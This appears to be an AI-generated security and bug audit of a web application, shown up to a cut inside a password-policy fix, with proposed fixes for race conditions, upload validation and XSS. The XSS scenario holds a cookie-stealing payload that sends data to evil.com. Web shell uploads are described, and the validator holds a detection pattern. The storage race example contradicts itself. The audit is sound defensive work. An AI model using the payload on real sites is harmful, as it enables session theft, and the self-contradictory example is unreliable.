# Known Issues and Potential Bugs

**Generated:** 2025-10-14
**Review Type:** Comprehensive Security & Bug Audit
**Reviewer:** Claude Code - Staff Software Engineer

## Executive Summary

This document outlines identified issues, potential bugs, and vulnerabilities in the Lumiku application codebase following a comprehensive security audit. Issues are prioritized by severity and potential impact on production systems.

**Overall Risk Assessment:** MEDIUM-HIGH
**Critical Issues Found:** 3
**High Priority Issues Found:** 7
**Medium Priority Issues Found:** 5
**Low Priority Issues Found:** 4

**Key Strengths:**
- Comprehensive rate limiting implementation
- Well-structured input validation using Zod schemas
- Payment callback security with signature verification
- Good separation of concerns with plugin architecture
- JWT-based authentication with secure practices

**Critical Gaps:**
- Race conditions in credit system (non-atomic operations)
- Missing FFmpeg process cleanup (potential memory leaks)
- No error boundaries in React application
- Missing transaction isolation in quota management
- Insufficient error handling in async operations

---

## Critical Issues (P0)

### 1. Race Condition in Credit Deduction System

**Severity:** P0 - CRITICAL
**Impact:** Credit balance inconsistencies, potential double-spending
**Location:**
- `C:\Users\yoppi\Downloads\Lumiku App\backend\src\services\credit.service.ts:43-69`
- `C:\Users\yoppi\Downloads\Lumiku App\backend\src\core\middleware\credit.middleware.ts:88-116`

**Description:**

The credit deduction system performs check-then-act operations without atomic database transactions. Multiple concurrent requests can read the same balance, pass the credit check, and then both deduct credits, leading to negative balances or double-spending.

**Vulnerable Code Flow:**
```typescript
// credit.service.ts:43-69
async deductCredits(input: DeductCreditsInput) {
  const currentBalance = await this.getBalance(input.userId)  // READ

  if (currentBalance < input.amount) {                        // CHECK
    throw new Error('Insufficient credits')
  }

  const newBalance = currentBalance - input.amount

  const credit = await prisma.credit.create({                 // WRITE
    data: {
      balance: newBalance,  // Race condition here!
      // ...
    }
  })
}
```

**Reproduction Steps:**
1. User has 10 credits
2. Two concurrent API requests both try to deduct 8 credits
3. Both requests read balance = 10
4. Both pass the credit check (10 >= 8)
5. First request creates record with balance = 2
6. Second request creates record with balance = 2 (should be -6!)
7. Result: User consumed 16 credits but balance shows 2

**Impact:**
- Users could bypass credit checks with concurrent requests
- Credit balance becomes inconsistent with actual usage
- Financial loss for PAYG users exploiting the vulnerability
- Data integrity violations in credit transaction history

**Recommended Fix:**

Use database transactions with optimistic locking or SELECT FOR UPDATE:

```typescript
async deductCredits(input: DeductCreditsInput) {
  return await prisma.$transaction(async (tx) => {
    // Option 1: Optimistic locking with latest balance
    const latestCredit = await tx.credit.findFirst({
      where: { userId: input.userId },
      orderBy: { createdAt: 'desc' },
      select: { balance: true, id: true }
    })

    const currentBalance = latestCredit?.balance || 0

    if (currentBalance < input.amount) {
      throw new Error('Insufficient credits')
    }

    const newBalance = currentBalance - input.amount

    // Create new credit record atomically
    const credit = await tx.credit.create({
      data: {
        userId: input.userId,
        amount: -input.amount,
        balance: newBalance,
        type: 'usage',
        description: input.description,
        referenceId: input.referenceId,
        referenceType: input.referenceType,
      },
    })

    return { credit, previousBalance: currentBalance, newBalance }
  }, {
    isolationLevel: 'Serializable' // Highest isolation level
  })
}
```

**Alternative:** Implement a distributed lock using Redis:

```typescript
async deductCredits(input: DeductCreditsInput) {
  const lockKey = `credit:lock:${input.userId}`
  const lock = await redis.set(lockKey, '1', 'NX', 'EX', 5) // 5 sec TTL

  if (!lock) {
    throw new Error('Another operation in progress. Please retry.')
  }

  try {
    // Perform deduction with transaction
    return await this.deductCreditsTransaction(input)
  } finally {
    await redis.del(lockKey)
  }
}
```

---

### 2. Memory Leaks in FFmpeg Video Processing

**Severity:** P0 - CRITICAL
**Impact:** Memory exhaustion, server crashes, degraded performance
**Location:**
- `C:\Users\yoppi\Downloads\Lumiku App\backend\src\lib\ffmpeg.ts:51-202`
- `C:\Users\yoppi\Downloads\Lumiku App\backend\src\workers\video-mixer.worker.ts:214-244`

**Description:**

FFmpeg processes and temporary files are not properly cleaned up in error scenarios. Event listeners accumulate without cleanup, and file handles remain open after process failures.

**Vulnerable Code:**

```typescript
// ffmpeg.ts:57-179
async mixVideos(
  inputs: VideoInput[],
  outputPath: string,
  options: ProcessingOptions,
  onProgress?: (progress: number) => void
): Promise<void> {
  return new Promise(async (resolve, reject) => {
    try {
      const command = ffmpeg()

      // Event listeners are registered but never removed!
      command.on('progress', (progress) => { /* ... */ })
      command.on('error', (err: any) => { /* ... */ })
      command.on('end', () => { /* ... */ })

      command.save(outputPath)
      // If process is killed externally, listeners remain attached
      // Temporary concat files may not be deleted
    } catch (error) {
      reject(error)  // Error thrown before cleanup!
    }
  })
}
```

**Issues Identified:**

1. **Event Listener Accumulation:**
   - `command.on()` listeners never removed with `removeAllListeners()`
   - Multiple failed jobs = accumulated listeners
   - Eventually causes memory leaks

2. **Orphaned FFmpeg Processes:**
   - No process tracking or cleanup on worker shutdown
   - Zombie processes continue consuming resources
   - No timeout mechanism for hung processes

3. **Temporary File Leaks:**
   - Concat files created at line 182-188 not deleted on error
   - Output files not cleaned up if generation marked as failed
   - Thumbnail generation failures leave orphaned temp files (line 251-266)

4. **Missing Stream Cleanup:**
   - Archive streams (line 425-451) not properly closed on error
   - File handles remain open if zip generation fails
   - ReadStream objects not explicitly destroyed

**Reproduction:**
1. Start video generation with 10 videos
2. Kill worker process mid-generation
3. FFmpeg process continues running (orphaned)
4. Temporary files remain in `/uploads/temp/`
5. Event listeners remain in memory (heap grows)
6. Repeat 20 times = 20 orphaned processes + 200MB temp files

**Impact:**
- Server memory exhaustion (OOM kill)
- Disk space exhaustion from temporary files
- CPU saturation from orphaned FFmpeg processes
- Worker process crashes requiring restart
- Production service degradation

**Recommended Fix:**

```typescript
class FFmpegService {
  private activeCommands: Map<string, any> = new Map()

  async mixVideos(
    inputs: VideoInput[],
    outputPath: string,
    options: ProcessingOptions,
    onProgress?: (progress: number) => void
  ): Promise<void> {
    const jobId = randomBytes(8).toString('hex')
    let command: any
    let concatFilePath: string | undefined

    // Timeout for hung processes
    const timeout = setTimeout(() => {
      if (command) {
        console.warn(`FFmpeg process timeout for job ${jobId}`)
        command.kill('SIGKILL')
      }
    }, 10 * 60 * 1000) // 10 minutes max

    try {
      command = ffmpeg()
      this.activeCommands.set(jobId, command)

      // ... setup command ...

      return new Promise((resolve, reject) => {
        const cleanup = async () => {
          clearTimeout(timeout)
          command.removeAllListeners() // Remove event listeners!
          this.activeCommands.delete(jobId)

          // Delete temporary files
          if (concatFilePath) {
            try {
              await fs.unlink(concatFilePath)
            } catch (e) {
              console.warn('Failed to cleanup concat file:', e)
            }
          }
        }

        command.on('error', async (err: any) => {
          await cleanup()

          // Kill process if still running
          try {
            command.kill('SIGKILL')
          } catch {}

          reject(new Error(`FFmpeg error: ${err.message}`))
        })

        command.on('end', async () => {
          await cleanup()
          resolve()
        })

        command.save(outputPath)
      })
    } catch (error) {
      clearTimeout(timeout)
      if (command) {
        command.removeAllListeners()
        this.activeCommands.delete(jobId)
        try {
          command.kill('SIGKILL')
        } catch {}
      }
      throw error
    }
  }

  // Cleanup all active FFmpeg processes on shutdown
  async cleanup() {
    console.log(`Cleaning up ${this.activeCommands.size} active FFmpeg processes`)

    for (const [jobId, command] of this.activeCommands) {
      try {
        command.kill('SIGTERM')
        await new Promise(resolve => setTimeout(resolve, 1000))
        command.kill('SIGKILL') // Force kill if still alive
      } catch (error) {
        console.error(`Failed to kill FFmpeg process ${jobId}:`, error)
      }
    }

    this.activeCommands.clear()
  }
}

// In worker file:
const ffmpegService = new FFmpegService()

// Graceful shutdown handler
process.on('SIGTERM', async () => {
  console.log('Worker shutting down, cleaning up FFmpeg processes...')
  await ffmpegService.cleanup()
  process.exit(0)
})
```

**Additional Recommendations:**

1. Implement temp file cleanup cron job
2. Add process monitoring and alerting
3. Set resource limits (ulimit) for worker processes
4. Implement circuit breaker for repeated failures
5. Add metrics for memory/CPU usage per job

---

### 3. Missing Error Boundaries in React Application

**Severity:** P0 - CRITICAL
**Impact:** Complete application crash, poor user experience, data loss
**Location:**
- `C:\Users\yoppi\Downloads\Lumiku App\frontend\src\App.tsx` (entire application)
- All route components lack error boundaries

**Description:**

The React application has ZERO error boundaries implemented. Any uncaught error in any component will crash the entire application, showing users a blank white screen with no recovery option.

**Current State:**
```typescript
// App.tsx - No error boundary!
function App() {
  return (
    <BrowserRouter>
      <AppContent />  {/* If any child crashes, entire app dies */}
    </BrowserRouter>
  )
}
```

**Vulnerable Scenarios:**

1. **API Response Parsing Errors:**
   - Malformed JSON from API crashes app
   - Missing expected fields cause runtime errors
   - Type mismatches cause undefined access

2. **State Management Errors:**
   - Zustand store corruption
   - Invalid state transitions
   - Missing null checks

3. **Third-Party Library Errors:**
   - React Router navigation errors
   - Form validation errors
   - UI component errors

4. **Async Operation Failures:**
   - Unhandled promise rejections
   - Network timeouts
   - Race conditions in useEffect

**Impact:**
- Users lose all unsaved work
- No way to recover without page reload
- Poor user experience and trust
- Lost revenue from abandoned sessions
- Support tickets and negative reviews

**Recommended Fix:**

Implement multi-level error boundaries:

```typescript
// src/components/ErrorBoundary.tsx
import React, { Component, ErrorInfo, ReactNode } from 'react'
import { Button } from './ui/Button'

interface Props {
  children: ReactNode
  fallback?: ReactNode
  level?: 'app' | 'page' | 'component'
  onError?: (error: Error, errorInfo: ErrorInfo) => void
}

interface State {
  hasError: boolean
  error: Error | null
  errorInfo: ErrorInfo | null
}

export class ErrorBoundary extends Component<Props, State> {
  constructor(props: Props) {
    super(props)
    this.state = {
      hasError: false,
      error: null,
      errorInfo: null,
    }
  }

  static getDerivedStateFromError(error: Error): State {
    return {
      hasError: true,
      error,
      errorInfo: null,
    }
  }

  componentDidCatch(error: Error, errorInfo: ErrorInfo) {
    console.error('ErrorBoundary caught error:', error, errorInfo)

    this.setState({
      error,
      errorInfo,
    })

    // Send to error tracking service (Sentry, LogRocket, etc.)
    if (this.props.onError) {
      this.props.onError(error, errorInfo)
    }

    // Log to backend
    this.logErrorToBackend(error, errorInfo)
  }

  private async logErrorToBackend(error: Error, errorInfo: ErrorInfo) {
    try {
      await fetch('/api/logs/frontend-error', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          message: error.message,
          stack: error.stack,
          componentStack: errorInfo.componentStack,
          level: this.props.level || 'app',
          timestamp: new Date().toISOString(),
          userAgent: navigator.userAgent,
          url: window.location.href,
        }),
      })
    } catch (loggingError) {
      console.error('Failed to log error to backend:', loggingError)
    }
  }

  private handleReset = () => {
    this.setState({
      hasError: false,
      error: null,
      errorInfo: null,
    })
  }

  render() {
    if (this.state.hasError) {
      if (this.props.fallback) {
        return this.props.fallback
      }

      const { level = 'app' } = this.props

      if (level === 'app') {
        return (
          <div className="min-h-screen flex items-center justify-center bg-slate-50 p-4">
            <div className="max-w-md w-full bg-white rounded-lg shadow-lg p-6">
              <div className="text-center">
                <div className="text-6xl mb-4">⚠️</div>
                <h1 className="text-2xl font-bold text-slate-900 mb-2">
                  Something went wrong
                </h1>
                <p className="text-slate-600 mb-6">
                  We're sorry for the inconvenience. The application encountered an unexpected error.
                </p>

                {process.env.NODE_ENV === 'development' && this.state.error && (
                  <details className="mb-4 text-left">
                    <summary className="cursor-pointer text-sm text-slate-500 hover:text-slate-700">
                      Error Details
                    </summary>
                    <pre className="mt-2 p-2 bg-slate-100 rounded text-xs overflow-auto max-h-40">
                      {this.state.error.toString()}
                      {'\n\n'}
                      {this.state.error.stack}
                    </pre>
                  </details>
                )}

                <div className="flex gap-3 justify-center">
                  <Button onClick={this.handleReset}>
                    Try Again
                  </Button>
                  <Button
                    variant="outline"
                    onClick={() => window.location.href = '/dashboard'}
                  >
                    Go to Dashboard
                  </Button>
                </div>
              </div>
            </div>
          </div>
        )
      }

      if (level === 'page') {
        return (
          <div className="p-6 bg-red-50 border border-red-200 rounded-lg">
            <h2 className="text-lg font-semibold text-red-900 mb-2">
              Page Error
            </h2>
            <p className="text-red-700 mb-4">
              This page encountered an error. Please try refreshing.
            </p>
            <Button onClick={this.handleReset} size="sm">
              Retry
            </Button>
          </div>
        )
      }

      // component level
      return (
        <div className="p-4 bg-yellow-50 border border-yellow-200 rounded">
          <p className="text-yellow-800 text-sm">
            This component failed to load. <button onClick={this.handleReset} className="underline">Try again</button>
          </p>
        </div>
      )
    }

    return this.props.children
  }
}

// Usage in App.tsx:
function App() {
  return (
    <ErrorBoundary level="app">
      <BrowserRouter>
        <AppContent />
      </BrowserRouter>
    </ErrorBoundary>
  )
}

// Usage for route pages:
function AppContent() {
  return (
    <Suspense fallback={<LoadingSpinner />}>
      <Routes>
        <Route
          path="/dashboard"
          element={
            <ErrorBoundary level="page">
              <Dashboard />
            </ErrorBoundary>
          }
        />
        {/* ... other routes with error boundaries */}
      </Routes>
    </Suspense>
  )
}

// Usage for critical components:
function VideoMixer() {
  return (
    <div>
      <ErrorBoundary level="component">
        <VideoUploadPanel />
      </ErrorBoundary>

      <ErrorBoundary level="component">
        <VideoGenerationPanel />
      </ErrorBoundary>
    </div>
  )
}
```

**Additional Requirements:**

1. Implement global error handler for promise rejections:
```typescript
// In main.tsx
window.addEventListener('unhandledrejection', (event) => {
  console.error('Unhandled promise rejection:', event.reason)
  // Log to backend
  fetch('/api/logs/unhandled-rejection', {
    method: 'POST',
    body: JSON.stringify({
      reason: event.reason?.toString(),
      stack: event.reason?.stack,
    })
  })
})
```

2. Add error tracking service (Sentry, LogRocket, etc.)
3. Implement retry logic for network failures
4. Add user-facing error messages for common errors
5. Implement session recovery to restore user work

---

## High Priority Issues (P1)

### 4. Race Condition in Quota Management

**Severity:** P1 - HIGH
**Impact:** Quota bypass, usage inconsistencies
**Location:**
- `C:\Users\yoppi\Downloads\Lumiku App\backend\src\services\quota.service.ts:74-111`

**Description:**

Similar to the credit system, quota increment operations use check-then-increment pattern without atomic transactions, allowing concurrent requests to bypass quota limits.

**Vulnerable Code:**
```typescript
// quota.service.ts:74-111
async incrementQuota(userId: string, modelKey: string, quotaCost: number = 1) {
  const quota = await prisma.quotaUsage.findUnique({ /* ... */ })  // READ

  if (!quota) {
    throw new Error('Quota record not found')
  }

  // Parse and update breakdown
  const breakdown = JSON.parse(quota.modelBreakdown || '{}')
  breakdown[modelId] = (breakdown[modelId] || 0) + quotaCost

  // Update quota - RACE CONDITION!
  await prisma.quotaUsage.update({
    where: { id: quota.id },
    data: {
      usageCount: quota.usageCount + quotaCost,  // Not atomic!
      modelBreakdown: JSON.stringify(breakdown)
    }
  })
}
```

**Recommended Fix:**
```typescript
async incrementQuota(userId: string, modelKey: string, quotaCost: number = 1) {
  return await prisma.$transaction(async (tx) => {
    const quota = await tx.quotaUsage.findUnique({
      where: {
        userId_period_quotaType: {
          userId,
          period: new Date().toISOString().split('T')[0],
          quotaType: 'daily'
        }
      }
    })

    if (!quota) {
      throw new Error('Quota record not found')
    }

    // Check quota limit before increment
    if (quota.usageCount + quotaCost > quota.quotaLimit) {
      throw new Error('Quota limit exceeded')
    }

    const breakdown = JSON.parse(quota.modelBreakdown || '{}')
    const modelId = modelKey.split(':')[1]
    breakdown[modelId] = (breakdown[modelId] || 0) + quotaCost

    await tx.quotaUsage.update({
      where: { id: quota.id },
      data: {
        usageCount: { increment: quotaCost },  // Atomic increment
        modelBreakdown: JSON.stringify(breakdown)
      }
    })
  })
}
```

---

### 5. Insecure File Upload Validation

**Severity:** P1 - HIGH
**Impact:** Malicious file uploads, server compromise, XSS
**Location:**
- `C:\Users\yoppi\Downloads\Lumiku App\backend\src\apps\video-mixer\routes.ts:159-215`
- `C:\Users\yoppi\Downloads\Lumiku App\backend\src\apps\avatar-creator\routes.ts:148-209`

**Description:**

File upload endpoints validate file types using client-provided MIME types (`file.type`) without verifying actual file content. Attackers can upload malicious files by manipulating MIME type headers.

**Vulnerable Code:**
```typescript
// video-mixer/routes.ts:159-215
routes.post('/videos/upload', authMiddleware, fileUploadLimiter, async (c) => {
  const file = formData.get('file') as File

  if (!file) {
    return c.json({ error: 'No file provided' }, 400)
  }

  // Only checks client-provided MIME type - INSECURE!
  // No magic number validation
  // No file extension whitelist

  const { filePath, fileName } = await saveFile(file, 'videos')
  // ...
  const video = await service.createVideo({
    mimeType: file.type,  // Trusts client input!
    // ...
  })
})
```

**Attack Scenarios:**

1. **Malicious Video Upload:**
   - Attacker uploads `malware.exe` with MIME type `video/mp4`
   - File passes validation and gets saved
   - When user downloads, browser executes malicious code

2. **Web Shell Upload:**
   - Upload `shell.php` as `image/jpeg`
   - If uploads directory is web-accessible
   - Attacker gains remote code execution

3. **XXE/XML Bomb:**
   - Upload malicious SVG with XXE payload
   - If processed server-side, can read files or DoS

**Recommended Fix:**

```typescript
import { fileTypeFromBuffer } from 'file-type'
import crypto from 'crypto'

const ALLOWED_VIDEO_TYPES = new Set([
  'video/mp4',
  'video/quicktime',
  'video/x-msvideo',
  'video/webm',
])

const ALLOWED_IMAGE_TYPES = new Set([
  'image/jpeg',
  'image/png',
  'image/webp',
])

const MAX_VIDEO_SIZE = 500 * 1024 * 1024 // 500MB
const MAX_IMAGE_SIZE = 10 * 1024 * 1024  // 10MB

async function validateVideoFile(file: File): Promise<{
  valid: boolean
  error?: string
  mimeType?: string
}> {
  // 1. Check file size
  if (file.size > MAX_VIDEO_SIZE) {
    return { valid: false, error: 'File size exceeds 500MB limit' }
  }

  if (file.size === 0) {
    return { valid: false, error: 'Empty file not allowed' }
  }

  // 2. Validate file extension
  const ext = file.name.split('.').pop()?.toLowerCase()
  const allowedExtensions = ['mp4', 'mov', 'avi', 'webm']

  if (!ext || !allowedExtensions.includes(ext)) {
    return { valid: false, error: 'Invalid file extension' }
  }

  // 3. Read first 4KB for magic number validation
  const arrayBuffer = await file.arrayBuffer()
  const buffer = Buffer.from(arrayBuffer)
  const header = buffer.slice(0, 4096)

  // 4. Detect actual MIME type from magic numbers
  const fileType = await fileTypeFromBuffer(header)

  if (!fileType) {
    return { valid: false, error: 'Could not determine file type' }
  }

  // 5. Verify MIME type matches expectations
  if (!ALLOWED_VIDEO_TYPES.has(fileType.mime)) {
    return {
      valid: false,
      error: `Invalid file type: ${fileType.mime}. Only video files allowed.`
    }
  }

  // 6. Additional security checks
  // Scan for suspicious patterns
  const headerStr = header.toString('ascii', 0, Math.min(1024, header.length))

  if (headerStr.includes('<?php') ||
      headerStr.includes('#!/bin/') ||
      headerStr.includes('<script>')) {
    return { valid: false, error: 'Suspicious file content detected' }
  }

  return { valid: true, mimeType: fileType.mime }
}

// Updated route:
routes.post('/videos/upload', authMiddleware, fileUploadLimiter, async (c) => {
  try {
    const userId = c.get('userId')
    const formData = await c.req.formData()

    const file = formData.get('file') as File
    if (!file) {
      return c.json({ error: 'No file provided' }, 400)
    }

    // Validate file
    const validation = await validateVideoFile(file)
    if (!validation.valid) {
      return c.json({ error: validation.error }, 400)
    }

    // Generate secure filename (prevents directory traversal)
    const secureFilename = `${Date.now()}_${crypto.randomBytes(16).toString('hex')}.${validation.mimeType.split('/')[1]}`

    // Save with validated MIME type
    const { filePath } = await saveFile(file, 'videos', secureFilename)

    // ... rest of upload logic ...

    const video = await service.createVideo({
      mimeType: validation.mimeType,  // Use validated MIME type
      // ...
    })

    return c.json({ success: true, video })
  } catch (error: any) {
    console.error('File upload error:', error)
    return c.json({ error: 'Upload failed' }, 500)
  }
})
```

**Additional Security Measures:**

1. Store uploads outside web root
2. Implement virus scanning (ClamAV)
3. Set restrictive file permissions (0644)
4. Use Content-Security-Policy headers
5. Implement file quarantine for suspicious uploads
6. Add honeypot files to detect automated attacks

---

### 6. Missing Input Sanitization in User-Generated Content

**Severity:** P1 - HIGH
**Impact:** XSS attacks, injection vulnerabilities
**Location:**
- `C:\Users\yoppi\Downloads\Lumiku App\backend\src\apps\carousel-mix\routes.ts` (text content)
- `C:\Users\yoppi\Downloads\Lumiku App\backend\src\apps\avatar-creator\routes.ts` (persona descriptions)

**Description:**

User-generated text content (carousel text, avatar descriptions, project names) is stored without sanitization and could contain XSS payloads that execute when rendered in the frontend.

**Vulnerable Code:**
```typescript
// carousel-mix/routes.ts - No sanitization
app.post('/projects/:projectId/texts', authMiddleware, async (c) => {
  const body = await c.req.json()

  // Directly stores unsanitized content!
  const text = await service.createText({
    content: body.content,  // Could be: <script>alert('XSS')</script>
    // ...
  })
})

// avatar-creator/routes.ts - No sanitization
app.post('/projects/:projectId/avatars/upload', authMiddleware, async (c) => {
  const uploadData = {
    personaName: body.personaName,  // No sanitization
    personaBackground: body.personaBackground,  // Could contain scripts
    // ...
  }
})
```

**Attack Scenario:**
1. Attacker creates carousel project
2. Adds text: `<img src=x onerror="fetch('https://evil.com?cookie='+document.cookie)">`
3. Text stored in database without sanitization
4. Victim views carousel in dashboard
5. XSS executes, stealing session token

**Recommended Fix:**

```typescript
import DOMPurify from 'isomorphic-dompurify'
import validator from 'validator'

function sanitizeText(text: string, options?: {
  allowHtml?: boolean
  maxLength?: number
}): string {
  const { allowHtml = false, maxLength = 10000 } = options || {}

  // Trim and limit length
  let sanitized = text.trim().slice(0, maxLength)

  if (allowHtml) {
    // Allow limited safe HTML
    sanitized = DOMPurify.sanitize(sanitized, {
      ALLOWED_TAGS: ['b', 'i', 'u', 'br', 'p'],
      ALLOWED_ATTR: []
    })
  } else {
    // Strip all HTML
    sanitized = validator.stripLow(sanitized)
    sanitized = validator.escape(sanitized)
  }

  return sanitized
}

// Updated route:
app.post('/projects/:projectId/texts', authMiddleware, async (c) => {
  const body = await c.req.json()

  // Validate and sanitize
  if (!body.content || typeof body.content !== 'string') {
    return c.json({ error: 'Invalid content' }, 400)
  }

  const sanitizedContent = sanitizeText(body.content, {
    allowHtml: false,
    maxLength: 5000
  })

  if (sanitizedContent.length === 0) {
    return c.json({ error: 'Content cannot be empty after sanitization' }, 400)
  }

  const text = await service.createText({
    content: sanitizedContent,
    // ...
  })

  return c.json({ success: true, text })
})
```

---

### 7. Insufficient Rate Limiting on Critical Operations

**Severity:** P1 - HIGH
**Impact:** Resource exhaustion, abuse, cost overruns
**Location:**
- `C:\Users\yoppi\Downloads\Lumiku App\backend\src\apps\avatar-creator\routes.ts:219` (AI generation)
- `C:\Users\yoppi\Downloads\Lumiku App\backend\src\apps\video-mixer\routes.ts:283` (video generation)

**Description:**

While basic rate limiting exists, critical operations like AI generation lack additional throttling based on resource cost. Users can spam expensive operations within rate limits, causing infrastructure costs and resource exhaustion.

**Missing Protections:**

1. **No Cost-Based Rate Limiting:**
   - Current limits are request-based, not cost-based
   - User can generate 100 4K videos vs 100 480p videos with same limit
   - No protection against high-cost model abuse

2. **No Concurrent Generation Limits:**
   - Users can start multiple expensive generations simultaneously
   - No queue depth limiting per user
   - Worker pool exhaustion possible

3. **No Burst Protection:**
   - Rate limiters allow bursts within window
   - Attacker can exhaust monthly quota in minutes

**Recommended Fix:**

```typescript
import { RateLimiterRedis } from 'rate-limiter-flexible'
import { redis } from '../../lib/redis'

// Cost-based rate limiter
const costBasedLimiter = new RateLimiterRedis({
  storeClient: redis,
  keyPrefix: 'cost_limit',
  points: 1000, // Cost points per day
  duration: 86400, // 24 hours
  blockDuration: 3600, // Block for 1 hour if exceeded
})

// Concurrent generation limiter
const concurrentLimiter = new RateLimiterRedis({
  storeClient: redis,
  keyPrefix: 'concurrent',
  points: 3, // Max 3 concurrent generations
  duration: 1,
})

async function checkGenerationLimits(
  userId: string,
  estimatedCost: number
): Promise<{ allowed: boolean; reason?: string }> {
  // 1. Check concurrent generations
  try {
    await concurrentLimiter.consume(userId, 1)
  } catch {
    return {
      allowed: false,
      reason: 'Maximum concurrent generations reached. Please wait for current jobs to complete.'
    }
  }

  // 2. Check cost-based limit
  try {
    await costBasedLimiter.consume(userId, estimatedCost)
  } catch (rejRes) {
    return {
      allowed: false,
      reason: `Daily cost limit exceeded. Available in ${Math.ceil(rejRes.msBeforeNext / 1000 / 60)} minutes.`
    }
  }

  // 3. Check pending job count
  const pendingJobs = await prisma.videoMixerGeneration.count({
    where: {
      userId,
      status: { in: ['pending', 'processing'] }
    }
  })

  if (pendingJobs >= 5) {
    return {
      allowed: false,
      reason: 'Maximum pending jobs reached. Please wait for current jobs to complete.'
    }
  }

  return { allowed: true }
}

// Updated route:
routes.post('/generate', authMiddleware, async (c) => {
  const userId = c.get('userId')
  const body = await c.req.json()

  // Calculate cost
  const estimate = await service.estimateGeneration(
    body.projectId,
    userId,
    body.settings,
    body.totalVideos
  )

  // Check generation limits
  const limitCheck = await checkGenerationLimits(userId, estimate.creditCost)
  if (!limitCheck.allowed) {
    return c.json({ error: limitCheck.reason }, 429)
  }

  // ... proceed with generation ...

  // On completion, release concurrent slot
  worker.on('completed', async (job) => {
    await concurrentLimiter.reward(userId, 1)
  })

  worker.on('failed', async (job) => {
    await concurrentLimiter.reward(userId, 1)
    await costBasedLimiter.reward(userId, estimate.creditCost) // Refund on failure
  })
})
```

---

### 8. Storage Quota Race Condition

**Severity:** P1 - HIGH
**Impact:** Storage exhaustion, quota bypass
**Location:**
- `C:\Users\yoppi\Downloads\Lumiku App\backend\src\lib\storage.ts:110-152`

**Description:**

Storage quota checking and updating follow check-then-act pattern without atomic operations. Multiple concurrent uploads can bypass storage quotas.

**Vulnerable Code:**
```typescript
// storage.ts:110-136
export async function checkStorageQuota(userId: string, fileSize: number) {
  const user = await prisma.user.findUnique({
    where: { id: userId },
    select: { storageQuota: true, storageUsed: true }
  })

  const newUsage = user.storageUsed + fileSize  // Calculate new usage
  const allowed = newUsage <= user.storageQuota  // Check quota

  return { allowed, used: user.storageUsed, quota: user.storageQuota }
}

// storage.ts:143-152
export async function updateUserStorage(userId: string, delta: number) {
  await prisma.user.update({
    where: { id: userId },
    data: { storageUsed: { increment: delta } }  // Separate update!
  })
}
```

**Race Condition Flow:**
1. User has 900MB used, 1GB quota
2. Two 200MB file uploads start simultaneously
3. Both check quota: 900MB + 200MB = 1.1GB > 1GB (both pass!)
4. Both files saved
5. Storage updated: 900MB + 200MB + 200MB = 1.3GB
6. User bypassed quota by 300MB

**Recommended Fix:**

```typescript
export async function checkAndReserveStorage(
  userId: string,
  fileSize: number
): Promise<{ allowed: boolean; reservation?: string }> {
  return await prisma.$transaction(async (tx) => {
    // Lock user row for update
    const user = await tx.user.findUnique({
      where: { id: userId },
      select: { id: true, storageQuota: true, storageUsed: true }
    })

    if (!user) {
      throw new Error('User not found')
    }

    const newUsage = user.storageUsed + fileSize

    if (newUsage > user.storageQuota) {
      return { allowed: false }
    }

    // Atomically increment storage
    await tx.user.update({
      where: { id: userId },
      data: {
        storageUsed: { increment: fileSize }
      }
    })

    const reservationId = crypto.randomBytes(16).toString('hex')

    return { allowed: true, reservation: reservationId }
  }, {
    isolationLevel: 'Serializable'
  })
}

// Rollback on upload failure
export async function releaseStorageReservation(
  userId: string,
  fileSize: number
): Promise<void> {
  await prisma.user.update({
    where: { id: userId },
    data: {
      storageUsed: { decrement: fileSize }
    }
  })
}

// Updated route:
routes.post('/videos/upload', authMiddleware, async (c) => {
  const file = formData.get('file') as File

  // Reserve storage atomically
  const reservation = await checkAndReserveStorage(userId, file.size)

  if (!reservation.allowed) {
    return c.json({ error: 'Storage quota exceeded' }, 413)
  }

  try {
    // Save file
    const { filePath } = await saveFile(file, 'videos')

    // Create record
    const video = await service.createVideo({ /* ... */ })

    return c.json({ success: true, video })
  } catch (error) {
    // Rollback storage reservation on failure
    await releaseStorageReservation(userId, file.size)
    throw error
  }
})
```

---

### 9. Weak Password Policy

**Severity:** P1 - HIGH
**Impact:** Account compromise, unauthorized access
**Location:**
- `C:\Users\yoppi\Downloads\Lumiku App\backend\src\routes\auth.routes.ts:25-29`
- `C:\Users\yoppi\Downloads\Lumiku App\backend\src\services\auth.service.ts`

**Description:**

Password validation only requires 8 characters with no complexity requirements. This is insufficient for protecting accounts with financial value (credits, subscriptions).

**Current Validation:**
```typescript
// auth.routes.ts:27
const registerSchema = z.object({
  email: z.string().email('Invalid email address'),
  password: z.string().min(8, 'Password must be at least 8 characters'),  // Too weak!
  name: z.string().optional(),
})
```

**Weaknesses:**
- No complexity requirements (e.g., "12345678" is valid)
- No common password check
- No password history
- No password strength meter
- No password expiration policy

**Recommended Fix:**

```typescript
import zxcvbn from 'zxcvbn'

// List of commonly breached passwords
const COMMON_PASSWORDS = new Set([
  'password', '12345678', 'qwerty', 'abc123', 'password1',
  'password123', '1234567890', 'admin', 'letmein', 'welcome'
  // Load full list from file or API
])

const passwordSchema = z.string()
  .min(12, 'Password must be at least 12 characters')
  .max(128, 'Password must not exceed 128 characters')
  .refine(
    (password) => !COMMON_PASSWORDS.has(password.toLowerCase()),
    'This password is too common and has been breached. Please choose a different password.'
  )
  .refine(
    (password) => {
      // Require at least 3 of: lowercase, uppercase, digit, special
      const hasLower = /[a-z]/.test(password)
      const hasUpper = /[A-Z]/.test(password)
      const hasDigit = /[0-9]/.test(password)
      const hasSpecial = /[^a-zA-Z0-9]/.test(password)

      const score = [hasLower, hasUpper, hasDigit, hasSpecial].filter(Boolean).length
      return score >= 3
    },
    'Password must include at least 3 of: lowercase, uppercase, digit, special character'
  )
  .refine(
    (password) => {
      // Check password strength using zxcvbn
      const result = zxcvbn(password)
      return result.score >= 3 // Require "strong" or better (0-4 scale)
    },
    'Password is too weak. Please add more variety or length.'
  )
  .refine(
    (password) => {
      // Check for repeating characters
      return !/(.)\1{2,}/.test(password) // No more than 2 consecutive repeats
    },
    'Password contains too many repeating characters'
  )

const registerSchema = z.object({
  email: z.string().email('Invalid email address'),
  password: passwordSchema,
  name: z.string().optional(),
})

// Add password strength endpoint
authRoutes.post('/password/strength', async (c) => {
  const { password } = await c.req.json()

  if (!password || typeof password !== 'string') {
    return c.json({ error: 'Password required' }, 400)
  }

  const result = zxcvbn(password)

  return c.json({
    score: result.score, // 0-4
    feedback: {
      warning: result.feedback.warning,
      suggestions: result.feedback.suggestions
    },
